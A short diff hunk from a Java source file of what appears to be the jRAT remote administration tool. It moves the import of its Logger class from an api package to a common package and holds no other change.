@@ -9,10 +9,10 @@ import java.io.Serializable;
 import java.util.ArrayList;
 import java.util.List;
 
-import pro.jrat.api.Logger;
 import pro.jrat.client.Slave;
 import pro.jrat.client.io.Files;
 import pro.jrat.client.ui.frames.Frame;
+import pro.jrat.common.Logger;
 
 import com.redpois0n.graphs.country.Country;
 
